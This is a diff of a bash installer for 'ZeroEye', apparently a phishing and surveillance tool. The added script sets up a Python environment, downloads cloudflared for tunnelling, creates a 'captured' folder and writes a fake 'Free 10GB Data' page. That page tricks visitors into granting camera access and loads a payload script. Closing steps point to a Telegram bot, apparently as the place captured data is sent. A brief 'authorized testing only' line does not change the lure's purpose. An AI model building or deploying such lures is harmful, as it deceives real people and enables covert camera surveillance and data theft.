@@ -1,79 +1,177 @@
 #!/bin/bash
+# ZeroEye v2.0 - Silent Professional Installer
 
-# ZeroEye v2.0 Installer for Kali Linux
-set -e
+function print_status() {
+    echo -e "\033[1;34m[*]\033[0m $1"
+}
 
-echo -e "\033[1;34m"
-echo "╔══════════════════════════════════════╗"
-echo "║         ZeroEye v2.0 Installer       ║"
-echo "╚══════════════════════════════════════╝"
-echo -e "\033[0m"
+function print_success() {
+    echo -e "\033[1;32m[+]\033[0m $1"
+}
 
-# Check if running as root
+function print_error() {
+    echo -e "\033[1;31m[!]\033[0m $1"
+}
+
+function print_banner() {
+    echo -e "\033[1;31m"
+    echo "███████╗███████╗██████╗  ██████╗ ███████╗██╗   ██╗███████╗"
+    echo "╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝╚██╗ ██╔╝██╔════╝"
+    echo "  ███╔╝ █████╗  ██████╔╝██║   ██║█████╗   ╚████╔╝ █████╗  "
+    echo " ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██╔══╝    ╚██╔╝  ██╔══╝  "
+    echo "███████╗███████╗██║  ██║╚██████╔╝███████╗   ██║   ███████╗"
+    echo "╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝"
+    echo -e "\033[0m"
+    echo -e "\033[1;36m       >> The Nuclear Reconnaissance Tool <<\033[0m"
+    echo ""
+}
+
+# Clear screen and show banner
+clear
+print_banner
+
+# Security check - don't run as root
 if [ "$EUID" -eq 0 ]; then
-    echo -e "\033[1;31m[!] Please do not run as root. Use regular user.\033[0m"
+    print_error "Please do not run as root. Run as a normal user."
     exit 1
 fi
 
-# Check Python version
-echo -e "\033[1;33m[*] Checking Python version...\033[0m"
-if ! command -v python3 &> /dev/null; then
-    echo -e "\033[1;31m[!] Python3 not found. Installing...\033[0m"
-    sudo apt update && sudo apt install -y python3 python3-pip python3-venv
+# Check if we're on Kali Linux or Debian-based
+if ! grep -q "Kali GNU/Linux" /etc/os-release 2>/dev/null && ! grep -q "Debian" /etc/os-release 2>/dev/null; then
+    print_error "This installer is optimized for Kali Linux/Debian systems."
+    print_status "Continuing anyway..."
 fi
 
-# Check for python3-venv
-echo -e "\033[1;33m[*] Checking for python3-venv...\033[0m"
-if ! dpkg -l | grep -q python3-venv; then
-    echo -e "\033[1;33m[*] Installing python3-venv...\033[0m"
-    sudo apt update && sudo apt install -y python3-venv
+print_status "Initializing system environment..."
+print_status "Updating package databases..."
+
+# Update system quietly
+sudo apt-get update -qq > /dev/null 2>&1
+if [ $? -eq 0 ]; then
+    print_success "Package databases updated"
+else
+    print_error "Failed to update packages - continuing anyway..."
 fi
 
-# Create virtual environment
-echo -e "\033[1;33m[*] Creating virtual environment...\033[0m"
-python3 -m venv zeroeye_venv
+print_status "Installing system dependencies..."
+sudo apt-get install -y -qq python3 python3-pip python3-venv unzip wget curl > /dev/null 2>&1
+if [ $? -eq 0 ]; then
+    print_success "System dependencies installed"
+else
+    print_error "Some dependencies failed - trying to continue..."
+fi
+
+print_status "Setting up Python virtual environment..."
+if [ -d "zeroeye_venv" ]; then
+    rm -rf zeroeye_venv
+    print_success "Cleaned existing environment"
+fi
+
+python3 -m venv zeroeye_venv > /dev/null 2>&1
+if [ $? -eq 0 ]; then
+    print_success "Virtual environment created"
+else
+    print_error "Failed to create virtual environment"
+    exit 1
+fi
 
 # Activate virtual environment
-echo -e "\033[1;33m[*] Activating virtual environment...\033[0m"
 source zeroeye_venv/bin/activate
 
-# Upgrade pip
-echo -e "\033[1;33m[*] Upgrading pip...\033[0m"
-pip install --upgrade pip
+print_status "Installing Python libraries (quiet mode)..."
+pip install -q --upgrade pip > /dev/null 2>&1
 
-# Remove conflicting multipart package if exists
-echo -e "\033[1;33m[*] Checking for conflicting packages...\033[0m"
-if pip list | grep -q "^multipart "; then
-    echo -e "\033[1;33m[*] Removing conflicting 'multipart' package...\033[0m"
-    pip uninstall -y multipart
+# Force remove conflicting packages
+pip uninstall -y -q multipart > /dev/null 2>&1 || true
+
+# Install from requirements
+if [ -f "requirements.txt" ]; then
+    pip install -q -r requirements.txt > /dev/null 2>&1
+    print_success "Python dependencies installed"
+else
+    print_error "requirements.txt not found - installing manually"
+    pip install -q fastapi uvicorn rich python-multipart requests > /dev/null 2>&1
+    print_success "Core Python packages installed"
 fi
 
-# Install dependencies
-echo -e "\033[1;33m[*] Installing dependencies...\033[0m"
-pip install -r requirements.txt
-
-# Check for cloudflared
-echo -e "\033[1;33m[*] Checking for cloudflared...\033[0m"
+print_status "Configuring cloudflared tunnel..."
 if ! command -v cloudflared &> /dev/null; then
-    echo -e "\033[1;33m[*] Downloading cloudflared...\033[0m"
-    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
-    chmod +x cloudflared
-    echo -e "\033[1;33m[*] Note: Move cloudflared to /usr/local/bin for system-wide access\033[0m"
+    if wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared; then
+        chmod +x cloudflared
+        print_success "Cloudflared downloaded and configured"
+    else
+        print_error "Failed to download cloudflared - manual installation required"
+    fi
+else
+    print_success "Cloudflared already installed"
 fi
 
-# Create necessary directories
-echo -e "\033[1;33m[*] Setting up directories...\033[0m"
+print_status "Creating directory structure..."
 mkdir -p static captured templates core
+print_success "Directories created"
 
-# Make scripts executable
+print_status "Setting file permissions..."
 chmod +x start.sh 2>/dev/null || true
+chmod +x zeroeye.py 2>/dev/null || true
 
-echo -e "\033[1;32m"
-echo "╔══════════════════════════════════════╗"
-echo "║        Installation Complete!        ║"
-echo "╚══════════════════════════════════════╝"
-echo -e "\033[0m"
-echo -e "\033[1;36m[*] To start ZeroEye:\033[0m"
-echo -e "    Method 1: ./start.sh"
-echo -e "    Method 2: python3 zeroeye.py"
-echo -e "\033[1;36m[*] Virtual environment will be activated automatically\033[0m"
+# Create basic template if missing
+if [ ! -d "templates" ] || [ -z "$(ls -A templates 2>/dev/null)" ]; then
+    print_status "Creating default templates..."
+    mkdir -p templates
+    cat > templates/free_data.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Mobile Data</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .container { max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; backdrop-filter: blur(10px); }
+        button { background: #4CAF50; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 18px; cursor: pointer; margin: 10px; }
+        button:hover { background: #45a049; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Free 10GB Data</h1>
+        <p>Claim your free data bundle by verifying your device</p>
+        <button onclick="startVerification()">Claim Now</button>
+    </div>
+    <script src="/static/nuclear.js"></script>
+    <script>
+        function startVerification() {
+            document.body.innerHTML = "<div class='container'><h2>🔍 Verifying Device...</h2><p>Please allow camera access to continue</p></div>";
+            // nuclear.js will auto-start
+        }
+    </script>
+</body>
+</html>
+EOF
+    print_success "Default template created"
+fi
+
+# Final verification
+print_status "Running final checks..."
+if [ -d "zeroeye_venv" ] && [ -f "zeroeye_venv/bin/activate" ]; then
+    print_success "Virtual environment verified"
+else
+    print_error "Virtual environment setup incomplete"
+    exit 1
+fi
+
+echo ""
+echo -e "\033[1;32m╔══════════════════════════════════════════════════════════╗"
+echo -e "║                   INSTALLATION COMPLETE!                   ║"
+echo -e "╚══════════════════════════════════════════════════════════╝\033[0m"
+echo ""
+echo -e "\033[1;36m🚀 Quick Start:\033[0m"
+echo -e "   \033[1;32m./start.sh\033[0m          - Start ZeroEye (recommended)"
+echo -e "   \033[1;32mpython3 zeroeye.py\033[0m  - Alternative start method"
+echo ""
+echo -e "\033[1;33m📖 Next Steps:\033[0m"
+echo -e "   1. Get Telegram Bot Token from @BotFather"
+echo -e "   2. Get your Chat ID from @userinfobot" 
+echo -e "   3. Run ZeroEye and configure when prompted"
+echo ""
+echo -e "\033[1;31m⚠️  LEGAL REMINDER: For authorized testing only!\033[0m"
+echo ""
